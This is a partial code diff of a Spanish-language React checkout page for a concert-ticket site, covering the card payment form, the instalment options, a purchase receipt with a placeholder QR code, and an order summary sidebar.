-                {errors.emailConfirm && <span className={styles.err}>{errors.emailConfirm}</span>}
-              </div>
-
-              <div className={styles.formField}>
-                <label className={styles.label}>Telefono celular</label>
-                <div className={styles.inputWrapper}>
-                  <Phone size={15} className={styles.inputIcon} />
-                  <input className={`${styles.input} ${styles.inputPad} ${errors.phone ? styles.inputError : ''}`} placeholder="1123456789" value={form.phone} onChange={e => set('phone', e.target.value.replace(/\D/g, '').slice(0, 15))} inputMode="numeric" />
-                </div>
-                {errors.phone && <span className={styles.err}>{errors.phone}</span>}
-              </div>
-
-              <div className={styles.secureNote}>
-                <Shield size={13} />
-                Tus datos estan protegidos y no seran compartidos con terceros.
-              </div>
-
-              <button className={styles.nextBtn} onClick={() => { if (validateDatos()) setStep('pago'); }}>
-                Continuar al pago
-                <ChevronRight size={17} />
-              </button>
-            </div>
-          )}
-
-          {/* ══ STEP 3: Pago ══════════════════════════════════════════════════ */}
-          {step === 'pago' && (
-            <div className={styles.card}>
-              <div className={styles.cardHeader}>
-                <CreditCard size={18} className={styles.cardHeaderIcon} />
-                <div>
-                  <h2 className={styles.cardTitle}>Metodo de pago</h2>
-                  <p className={styles.cardSub}>Ingresa los datos de tu tarjeta. La transaccion es segura y encriptada.</p>
-                </div>
-              </div>
-
-              {/* Debito / Credito selector */}
-              <div className={styles.modeSection}>
-                <div className={styles.fieldLabel}>Tipo de tarjeta</div>
-                <div className={styles.modeGrid}>
-                  <button
-                    className={`${styles.modeBtn} ${form.cardMode === 'credito' ? styles.modeBtnActive : ''}`}
-                    onClick={() => { set('cardMode', 'credito'); set('cuotas', 1); }}
-                  >
-                    <div className={styles.modeBtnInner}>
-                      <div className={`${styles.modeRadio} ${form.cardMode === 'credito' ? styles.modeRadioActive : ''}`} />
-                      <div>
-                        <div className={styles.modeName}>Tarjeta de Credito</div>
-                        <div className={styles.modeSub}>Pago en cuotas disponible</div>
-                      </div>
-                    </div>
-                    {detectedType === 'credito' && (
-                      <span className={styles.modeDetected}>Detectada</span>
-                    )}
-                  </button>
-                  <button
-                    className={`${styles.modeBtn} ${form.cardMode === 'debito' ? styles.modeBtnActive : ''}`}
-                    onClick={() => { set('cardMode', 'debito'); set('cuotas', 1); }}
-                  >
-                    <div className={styles.modeBtnInner}>
-                      <div className={`${styles.modeRadio} ${form.cardMode === 'debito' ? styles.modeRadioActive : ''}`} />
-                      <div>
-                        <div className={styles.modeName}>Tarjeta de Debito</div>
-                        <div className={styles.modeSub}>Pago en un solo debito</div>
-                      </div>
-                    </div>
-                    {detectedType === 'debito' && (
-                      <span className={styles.modeDetected}>Detectada</span>
-                    )}
-                  </button>
-                </div>
-              </div>
-
-              {/* Accepted brands */}
-              <div className={styles.brandsRow}>
-                <span className={styles.brandsLabel}>Tarjetas aceptadas</span>
-                <div className={styles.brandsLogos}>
-                  {['VISA','MASTERCARD','AMEX','CABAL','NARANJA','DINERS'].map(n => (
-                    <CardNetworkLogo key={n} network={n} size={38} />
-                  ))}
-                </div>
-              </div>
-
-              {/* Card visual */}
-              <div className={styles.cardVisual} style={{ background: cardInfo.brand ? `linear-gradient(135deg, ${cardInfo.color}, #0d0920)` : 'linear-gradient(135deg, #1e1048, #0d0920)' }}>
+              {/* Card preview */}
+              <div className={styles.cardViz} style={{background:`linear-gradient(135deg, ${ci.color||'#1e1048'} 0%, #080512 100%)`}}>
                 <div className={styles.cvTop}>
-                  <div className={styles.cvChip}>
-                    <svg width="30" height="24" viewBox="0 0 30 24"><rect x="1" y="1" width="28" height="22" rx="4" fill="#d4a017" stroke="#b8860b" strokeWidth="1"/><line x1="1" y1="8" x2="29" y2="8" stroke="#b8860b" strokeWidth="0.8"/><line x1="1" y1="16" x2="29" y2="16" stroke="#b8860b" strokeWidth="0.8"/><line x1="10" y1="1" x2="10" y2="23" stroke="#b8860b" strokeWidth="0.8"/><line x1="20" y1="1" x2="20" y2="23" stroke="#b8860b" strokeWidth="0.8"/></svg>
-                  </div>
-                  <div className={styles.cvBrandArea}>
-                    {cardInfo.network ? (
-                      <div className={styles.cvBrandDetected}>
-                        <CardNetworkLogo network={cardInfo.network} size={42} />
-                        <span className={styles.cvBrandName}>{cardInfo.brand}</span>
-                      </div>
-                    ) : (
-                      <div className={styles.cvBrandPlaceholder}>
-                        <CardNetworkLogo network="VISA" size={34} />
-                        <CardNetworkLogo network="MASTERCARD" size={34} />
-                      </div>
-                    )}
+                  <svg width="28" height="22" viewBox="0 0 30 24"><rect x="1" y="1" width="28" height="22" rx="4" fill="#d4a017" stroke="#b8860b" strokeWidth="0.8"/><line x1="1" y1="8" x2="29" y2="8" stroke="#b8860b" strokeWidth="0.7"/><line x1="1" y1="16" x2="29" y2="16" stroke="#b8860b" strokeWidth="0.7"/><line x1="10" y1="1" x2="10" y2="23" stroke="#b8860b" strokeWidth="0.7"/><line x1="20" y1="1" x2="20" y2="23" stroke="#b8860b" strokeWidth="0.7"/></svg>
+                  <div className={styles.cvBrand}>
+                    {ci.network?<><NetLogo net={ci.network} size={40}/><span className={styles.cvBrandName}>{ci.brand}</span></>
+                    :<div style={{display:'flex',gap:6,opacity:0.3}}><NetLogo net="VISA" size={32}/><NetLogo net="MASTERCARD" size={32}/></div>}
                   </div>
                 </div>
-                <div className={styles.cvNumber}>
-                  {form.cardNumber || '**** **** **** ****'}
-                </div>
-                <div className={styles.cvBottom}>
-                  <div>
-                    <div className={styles.cvLabel}>TITULAR</div>
-                    <div className={styles.cvVal}>{form.cardHolder || 'NOMBRE APELLIDO'}</div>
-                  </div>
-                  <div>
-                    <div className={styles.cvLabel}>VENCE</div>
-                    <div className={styles.cvVal}>{form.cardExpiry || 'MM/AA'}</div>
-                  </div>
-                  <div>
-                    <div className={styles.cvLabel}>TIPO</div>
-                    <div className={styles.cvVal}>{form.cardMode === 'credito' ? 'CREDITO' : 'DEBITO'}</div>
-                  </div>
+                <div className={styles.cvNum}>{form.num||'**** **** **** ****'}</div>
+                <div className={styles.cvBot}>
+                  <div><div className={styles.cvLbl}>TITULAR</div><div className={styles.cvVal}>{form.holder||'NOMBRE APELLIDO'}</div></div>
+                  <div><div className={styles.cvLbl}>VENCE</div><div className={styles.cvVal}>{form.expiry||'MM/AA'}</div></div>
+                  <div><div className={styles.cvLbl}>TIPO</div><div className={styles.cvVal}>{form.mode==='credito'?'CREDITO':'DEBITO'}</div></div>
                 </div>
               </div>
 
-              {/* Card number */}
-              <div className={styles.formField}>
-                <label className={styles.label}>Numero de tarjeta</label>
-                <div className={styles.cardNumWrapper}>
-                  <input
-                    className={`${styles.input} ${styles.cardNumInput} ${errors.cardNumber ? styles.inputError : ''}`}
-                    placeholder="1234 5678 9012 3456"
-                    value={form.cardNumber}
-                    onChange={e => set('cardNumber', fmtCard(e.target.value))}
-                    maxLength={23}
-                    inputMode="numeric"
-                  />
-                  {cardInfo.network && (
-                    <div className={styles.cardNumBrand}>
-                      <CardNetworkLogo network={cardInfo.network} size={36} />
-                    </div>
-                  )}
+              {/* Fields */}
+              <div className={styles.f}>
+                <label className={styles.lbl}>Numero de tarjeta</label>
+                <div style={{position:'relative'}}>
+                  <input className={`${styles.inp} ${styles.monoInp} ${errs.num?styles.inpErr:''}`} placeholder="1234 5678 9012 3456" value={form.num} onChange={e=>s('num',fmt(e.target.value))} maxLength={23} inputMode="numeric"/>
+                  {ci.network&&<div style={{position:'absolute',right:12,top:'50%',transform:'translateY(-50%)'}}><NetLogo net={ci.network} size={32}/></div>}
                 </div>
-                {errors.cardNumber && <span className={styles.err}>{errors.cardNumber}</span>}
-                {cardInfo.brand && (
-                  <span className={styles.cardDetectedMsg}>
-                    Detectada: {cardInfo.brand} — {cardInfo.type === 'credito' ? 'Credito' : cardInfo.type === 'debito' ? 'Debito' : ''}
-                  </span>
-                )}
+                {errs.num&&<span className={styles.err}>{errs.num}</span>}
+                {ci.brand&&<span className={styles.detected2}>{ci.brand} — {ci.type==='credito'?'Credito':ci.type==='debito'?'Debito':''}</span>}
               </div>
 
-              <div className={styles.formField}>
-                <label className={styles.label}>Nombre del titular — tal como figura en la tarjeta</label>
-                <input
-                  className={`${styles.input} ${errors.cardHolder ? styles.inputError : ''}`}
-                  placeholder="JUAN GARCIA"
-                  value={form.cardHolder}
-                  onChange={e => set('cardHolder', e.target.value.toUpperCase())}
-                />
-                {errors.cardHolder && <span className={styles.err}>{errors.cardHolder}</span>}
+              <div className={styles.f}>
+                <label className={styles.lbl}>Titular de la tarjeta</label>
+                <input className={`${styles.inp} ${errs.holder?styles.inpErr:''}`} placeholder="JUAN GARCIA" value={form.holder} onChange={e=>s('holder',e.target.value.toUpperCase())}/>
+                {errs.holder&&<span className={styles.err}>{errs.holder}</span>}
               </div>
 
-              <div className={styles.formRow}>
+              <div className={styles.g2}>
                 <div>
-                  <label className={styles.label}>Fecha de vencimiento</label>
-                  <input
-                    className={`${styles.input} ${errors.cardExpiry ? styles.inputError : ''}`}
-                    placeholder="MM/AA"
-                    value={form.cardExpiry}
-                    onChange={e => set('cardExpiry', fmtExp(e.target.value))}
-                    maxLength={5}
-                    inputMode="numeric"
-                  />
-                  {errors.cardExpiry && <span className={styles.err}>{errors.cardExpiry}</span>}
+                  <label className={styles.lbl}>Vencimiento</label>
+                  <input className={`${styles.inp} ${errs.expiry?styles.inpErr:''}`} placeholder="MM/AA" value={form.expiry} onChange={e=>s('expiry',fmtExp(e.target.value))} maxLength={5} inputMode="numeric"/>
+                  {errs.expiry&&<span className={styles.err}>{errs.expiry}</span>}
                 </div>
                 <div>
-                  <label className={styles.label}>
-                    Codigo de seguridad
-                    <span className={styles.cvvHint} title="3 digitos en el dorso. AMEX: 4 digitos al frente.">?</span>
-                  </label>
-                  <div className={styles.inputWrapper}>
-                    <input
-                      className={`${styles.input} ${errors.cardCvv ? styles.inputError : ''}`}
-                      placeholder={/^3[47]/.test(form.cardNumber.replace(/\s/g,'')) ? '1234' : '123'}
-                      value={form.cardCvv}
-                      onChange={e => set('cardCvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
-                      type="password"
-                      maxLength={4}
-                      inputMode="numeric"
-                    />
-                    <Lock size={14} className={styles.inputIconRight} />
+                  <label className={styles.lbl}>CVV / CVC <span className={styles.cvvHint} title="3 digitos dorso, AMEX 4 digitos frente">?</span></label>
+                  <div className={styles.iw}>
+                    <input className={`${styles.inp} ${errs.cvv?styles.inpErr:''}`} placeholder={/^3[47]/.test(form.num.replace(/\s/g,''))?'1234':'123'} value={form.cvv} onChange={e=>s('cvv',e.target.value.replace(/\D/g,'').slice(0,4))} type="password" maxLength={4} inputMode="numeric"/>
+                    <Lock size={13} className={styles.ir}/>
                   </div>
-                  {errors.cardCvv && <span className={styles.err}>{errors.cardCvv}</span>}
+                  {errs.cvv&&<span className={styles.err}>{errs.cvv}</span>}
                 </div>
               </div>
 
-              {/* Cuotas — solo credito */}
-              {form.cardMode === 'credito' && (
-                <div className={styles.formField}>
-                  <label className={styles.label}>Cuotas</label>
-                  <div className={styles.cuotasGrid}>
-                    {CUOTAS.map(c => (
-                      <button
-                        key={c.n}
-                        className={`${styles.cuotaBtn} ${form.cuotas === c.n ? styles.cuotaBtnActive : ''}`}
-                        onClick={() => set('cuotas', c.n)}
-                      >
+              {form.mode==='credito'&&(
+                <div className={styles.f}>
+                  <label className={styles.lbl}>Cuotas</label>
+                  <div className={styles.cuotasG}>
+                    {CUOTAS.map(c=>(
+                      <button key={c.n} className={`${styles.cuotaBtn} ${form.cuotas===c.n?styles.cuotaBtnOn:''}`} onClick={()=>s('cuotas',c.n)}>
                         <span className={styles.cuotaN}>{c.n}x</span>
                         <span className={styles.cuotaSub}>{c.sub}</span>
-                        <span className={styles.cuotaAmt}>{formatCurrency(Math.ceil(subtotal / c.n))}</span>
+                        <span className={styles.cuotaAmt}>{formatCurrency(Math.ceil(total/c.n))}</span>
                       </button>
                     ))}
                   </div>
                 </div>
               )}
 
-              <div className={styles.sslRow}>
-                <Lock size={12} />
-                <span>Pago cifrado con SSL 256-bit. Pacify nunca almacena el numero completo de tu tarjeta.</span>
-              </div>
-
-              <button className={styles.payBtn} onClick={handlePay} disabled={loading}>
-                {loading ? (
-                  <><span className={styles.spinner} />Procesando pago...</>
-                ) : (
-                  <><Lock size={16} />Pagar {formatCurrency(subtotal)}</>
-                )}
+              <div className={styles.ssl}><Lock size={11}/>Cifrado SSL 256-bit. Pacify no almacena datos sensibles en servidores externos.</div>
+              <button className={styles.payBtn} onClick={pay} disabled={loading}>
+                {loading?<><span className={styles.spin}/>Procesando...</>:<><Lock size={15}/>Pagar {formatCurrency(total)}</>}
               </button>
             </div>
           )}
 
-          {/* ══ STEP 4: Confirmacion ══════════════════════════════════════════ */}
-          {step === 'confirmacion' && (
+          {/* STEP 4 - SUCCESS */}
+          {step==='ok'&&(
             <div className={styles.successCard}>
-              <div className={styles.successIconWrap}>
-                <CheckCircle size={60} color="#10b981" strokeWidth={1.5} />
-              </div>
+              <div className={styles.successIcon}><CheckCircle size={56} color="#10b981" strokeWidth={1.5}/></div>
               <h2 className={styles.successTitle}>Pago confirmado</h2>
-              <p className={styles.successSub}>
-                Tus entradas fueron procesadas. Recibirás un correo en <strong>{form.email}</strong> con los codigos QR de ingreso.
-              </p>
-
-              <div className={styles.ticketDoc}>
-                <div className={styles.ticketDocHeader}>
-                  <Ticket size={16} />
-                  Comprobante de compra — {purchaseId}
-                </div>
-
-                <div className={styles.ticketDocBody}>
-                  <div className={styles.ticketGroup}>
-                    <div className={styles.ticketGroupTitle}>Evento</div>
-                    <div className={styles.ticketRow}><span>Show</span><strong>{safeShow.title}</strong></div>
-                    <div className={styles.ticketRow}><span>Fecha</span><strong>{safeShow.dateLabel}</strong></div>
-                    <div className={styles.ticketRow}><span>Horario</span><strong>Puertas {safeShow.puertas} — Show {safeShow.showTime}</strong></div>
-                    <div className={styles.ticketRow}><span>Venue</span><strong>Pacify Arena — Buenos Aires</strong></div>
+              <p className={styles.successSub}>Tus entradas fueron procesadas. Recibirás el QR en <strong>{form.email}</strong></p>
+              <div className={styles.receipt}>
+                <div className={styles.receiptHead}><Ticket size={14}/>Comprobante — {pid}</div>
+                <div className={styles.receiptBody}>
+                  <div className={styles.rGroup}>
+                    <div className={styles.rTitle}>Evento</div>
+                    <div className={styles.rRow}><span>Show</span><strong>{safeShow.title}</strong></div>
+                    <div className={styles.rRow}><span>Fecha</span><strong>{safeShow.dateLabel}</strong></div>
+                    <div className={styles.rRow}><span>Horario</span><strong>Puertas {safeShow.puertas} — Show {safeShow.showTime}</strong></div>
+                    <div className={styles.rRow}><span>Sector</span><strong>{form.section} x{form.qty}</strong></div>
                   </div>
-                  <div className={styles.ticketDivider} />
-                  <div className={styles.ticketGroup}>
-                    <div className={styles.ticketGroupTitle}>Entradas</div>
-                    <div className={styles.ticketRow}><span>Sector</span><strong>{form.section}</strong></div>
-                    <div className={styles.ticketRow}><span>Cantidad</span><strong>{form.quantity}</strong></div>
+                  <div className={styles.rDivider}/>
+                  <div className={styles.rGroup}>
+                    <div className={styles.rTitle}>Comprador</div>
+                    <div className={styles.rRow}><span>Nombre</span><strong>{form.firstName} {form.lastName}</strong></div>
+                    <div className={styles.rRow}><span>DNI</span><strong>{form.dni}</strong></div>
                   </div>
-                  <div className={styles.ticketDivider} />
-                  <div className={styles.ticketGroup}>
-                    <div className={styles.ticketGroupTitle}>Comprador</div>
-                    <div className={styles.ticketRow}><span>Nombre</span><strong>{form.firstName} {form.lastName}</strong></div>
-                    <div className={styles.ticketRow}><span>DNI</span><strong>{form.dni}</strong></div>
-                    <div className={styles.ticketRow}><span>Email</span><strong>{form.email}</strong></div>
-                  </div>
-                  <div className={styles.ticketDivider} />
-                  <div className={styles.ticketGroup}>
-                    <div className={styles.ticketGroupTitle}>Pago</div>
-                    <div className={styles.ticketRow}><span>Metodo</span><strong>{cardInfo.brand || 'Tarjeta'} — {form.cardMode === 'credito' ? 'Credito' : 'Debito'}</strong></div>
-                    <div className={styles.ticketRow}><span>Total cobrado</span><strong className={styles.totalGreen}>{formatCurrency(subtotal)}</strong></div>
-                    {form.cardMode === 'credito' && form.cuotas > 1 && (
-                      <div className={styles.ticketRow}><span>Cuotas</span><strong>{form.cuotas} x {formatCurrency(Math.ceil(subtotal / form.cuotas))}</strong></div>
-                    )}
+                  <div className={styles.rDivider}/>
+                  <div className={styles.rGroup}>
+                    <div className={styles.rTitle}>Pago</div>
+                    <div className={styles.rRow}><span>Tarjeta</span><strong>{ci.brand||'Tarjeta'} — {form.mode}</strong></div>
+                    <div className={styles.rRow}><span>Total</span><strong className={styles.green}>{formatCurrency(total)}</strong></div>
+                    {form.mode==='credito'&&form.cuotas>1&&<div className={styles.rRow}><span>Cuotas</span><strong>{form.cuotas}x {formatCurrency(Math.ceil(total/form.cuotas))}</strong></div>}
                   </div>
                 </div>
-
-                <div className={styles.qrArea}>
-                  <div className={styles.qrCode}>
-                    {/* Simulated QR */}
-                    <svg width="96" height="96" viewBox="0 0 96 96" fill="none">
-                      {[0,1,2,3,4,5,6].flatMap(r => [0,1,2,3,4,5,6].map(c => {
-                        const edge = r===0||r===6||c===0||c===6;
-                        const center = r>=2&&r<=4&&c>=2&&c<=4;
-                        if (edge||center) return <rect key={`a${r}${c}`} x={r*13+1} y={c*13+1} width="12" height="12" rx="1" fill="#111"/>;
-                        return null;
-                      }))}
-                      {[0,1,2,3,4,5,6].flatMap(r => [0,1,2,3,4,5,6].map(c => {
-                        const oy = 55;
-                        const edge = r===0||r===6||c===0||c===6;
-                        const center = r>=2&&r<=4&&c>=2&&c<=4;
-                        if (edge||center) return <rect key={`b${r}${c}`} x={r*13+1} y={c*6+oy} width="12" height="5" rx="1" fill="#111"/>;
-                        return null;
-                      }))}
-                      {Array.from({length:12},(_,i)=>(
-                        <rect key={`d${i}`} x={(i%4)*13+56} y={Math.floor(i/4)*13+1} width="10" height="10" rx="1" fill="#111" opacity={i%3===0?0:1}/>
-                      ))}
+                <div className={styles.qrZone}>
+                  <div className={styles.qrBox}>
+                    <svg width="88" height="88" viewBox="0 0 88 88" fill="none">
+                      {[0,1,2,3,4,5,6].flatMap(r=>[0,1,2,3,4,5,6].map(c=>{const e=r===0||r===6||c===0||c===6;const ct=r>=2&&r<=4&&c>=2&&c<=4;if(e||ct)return<rect key={`a${r}${c}`} x={r*12+1} y={c*12+1} width="11" height="11" rx="1" fill="#111"/>; return null;}))}
+                      {Array.from({length:14},(_,i)=><rect key={`d${i}`} x={(i%4)*12+52} y={Math.floor(i/4)*12+1} width="9" height="9" rx="1" fill="#111" opacity={i%3===0?0:1}/>)}
                     </svg>
                   </div>
-                  <div className={styles.qrText}>
-                    <div className={styles.qrTitle}>Codigo de ingreso</div>
-                    <div className={styles.qrSub}>Presenta este QR junto a tu DNI en la puerta del evento. Un QR por persona.</div>
-                  </div>
+                  <div><div className={styles.qrTitle}>Codigo QR de ingreso</div><div className={styles.qrSub}>Presentalo junto a tu DNI en la puerta</div></div>
                 </div>
               </div>
-
-              <div className={styles.successActions}>
-                <button className="btn-primary" onClick={() => navigate('/')}>Volver al inicio</button>
-                <button className="btn-outline" onClick={() => navigate('/shows')}>Ver mas shows</button>
+              <div className={styles.successActs}>
+                <button className="btn-primary" onClick={()=>nav('/')}>Volver al inicio</button>
+                <button className="btn-outline" onClick={()=>nav('/shows')}>Ver mas shows</button>
               </div>
             </div>
           )}
         </div>
 
-        {/* ── Sidebar: Order summary ─────────────────────────────────────────── */}
-        {step !== 'confirmacion' && (
-          <aside className={styles.sidebar}>
-            <div className={styles.summaryCard}>
-              <div className={styles.summaryHeader}>Resumen de orden</div>
-
-              <div className={styles.summaryImgWrap}>
-                <img src={`/images/${safeShow.image}`} alt={safeShow.title}
-                  onError={e => { const t = e.target as HTMLImageElement; t.style.display='none'; (t.nextElementSibling as HTMLElement).style.display='flex'; }}
-                />
-                <div className={styles.summaryImgFallback} style={{ background: safeShow.bgGradient }}>{safeShow.title}</div>
+        {/* SIDEBAR */}
+        {step!=='ok'&&(
+          <aside className={styles.side}>
+            <div className={styles.summary}>
+              <div className={styles.summaryHead}>Resumen</div>
+              <div className={styles.summaryImg}>
+                <img src={`/images/${safeShow.image}`} alt={safeShow.title} onError={e=>{const t=e.target as HTMLImageElement;t.style.display='none';(t.nextElementSibling as HTMLElement).style.display='flex';}}/>
+                <div className={styles.summaryFallback} style={{background:safeShow.bgGradient}}>{safeShow.title}</div>
               </div>
-
               <div className={styles.summaryInfo}>
                 <div className={styles.summaryShow}>{safeShow.title}</div>
-                <div className={styles.summaryMeta}><MapPin size={12} />{safeShow.dateLabel}</div>
-                <div className={styles.summaryMeta}><Clock size={12} />Show: {safeShow.showTime}</div>
+                <div className={styles.summaryMeta}><MapPin size={11}/>{safeShow.dateLabel}</div>
+                <div className={styles.summaryMeta}><Clock size={11}/>Show: {safeShow.showTime}</div>
               </div>
-
-              <div className={styles.summaryBreakdown}>
-                <div className={styles.summaryLine}>
-                  <span>{form.quantity}x {form.section}</span>
-                  <span>{formatCurrency(basePrice * form.quantity)}</span>
-                </div>
-                <div className={styles.summaryLine}>
-                  <span>Cargo por servicio</span>
-                  <span>{formatCurrency(serviceFee * form.quantity)}</span>
-                </div>
-                <div className={styles.summaryDivider} />
-                <div className={`${styles.summaryLine} ${styles.summaryTotal}`}>
-                  <span>Total</span>
-                  <span>{formatCurrency(subtotal)}</span>
-                </div>
-                {form.cardMode === 'credito' && form.cuotas > 1 && (
-                  <div className={styles.summaryCuotas}>
-                    {form.cuotas} cuotas de {formatCurrency(Math.ceil(subtotal / form.cuotas))}
-                  </div>
-                )}
+              <div className={styles.summaryBd}>
+                <div className={styles.bdRow}><span>{form.qty}x {form.section}</span><span>{formatCurrency(base*form.qty)}</span></div>
+                <div className={styles.bdRow}><span>Cargo por servicio</span><span>{formatCurrency(fee*form.qty)}</span></div>
+                <div className={styles.bdDiv}/>
+                <div className={`${styles.bdRow} ${styles.bdTotal}`}><span>Total</span><span>{formatCurrency(total)}</span></div>
+                {form.mode==='credito'&&form.cuotas>1&&<div className={styles.bdCuota}>{form.cuotas} cuotas de {formatCurrency(Math.ceil(total/form.cuotas))}</div>}
               </div>
-
-              <div className={styles.summaryFooter}>
-                <Shield size={12} />
-                Compra 100% segura y protegida
-              </div>
+              <div className={styles.summaryFoot}><Shield size={11}/>Compra 100% segura</div>
             </div>
           </aside>
         )}
